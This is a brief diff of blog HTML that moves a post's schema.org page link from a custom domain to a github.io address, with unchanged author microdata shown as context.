-    <link itemprop="mainEntityOfPage" href="http://blog.czxvan.cn/2023/10/17/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/17/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
